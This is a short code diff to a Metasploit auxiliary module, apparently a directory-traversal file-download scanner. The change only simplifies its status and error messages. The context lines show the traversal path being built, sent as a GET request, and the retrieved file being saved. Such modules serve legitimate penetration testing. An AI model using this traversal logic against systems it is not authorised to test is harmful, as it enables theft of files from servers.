@@ -50,7 +50,7 @@ class MetasploitModule < Msf::Auxiliary
   def run_host(ip)
     # No point to continue if no filename is specified
     if datastore['FILEPATH'].nil? or datastore['FILEPATH'].empty?
-      print_error("#{Rex::Socket.to_authority(rhost, rport)} - Please supply FILEPATH")
+      print_error("Please supply FILEPATH")
       return
     end
 
@@ -58,7 +58,7 @@ class MetasploitModule < Msf::Auxiliary
     travs << "/" unless datastore['FILEPATH'][0] == "\\" or datastore['FILEPATH'][0] == "/"
     travs << datastore['FILEPATH']
 
-    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Sending request...")
+    print_status("Sending request...")
     res = send_request_cgi({
       'uri' => travs,
       'method' => 'GET',
@@ -74,9 +74,9 @@ class MetasploitModule < Msf::Auxiliary
         contents,
         fname
       )
-      print_status("#{Rex::Socket.to_authority(rhost, rport)} - File saved in: #{path}")
+      print_status("File saved in: #{path}")
     else
-      print_error("#{Rex::Socket.to_authority(rhost, rport)} - Failed to retrieve file")
+      print_error("Failed to retrieve file")
       return
     end
   end
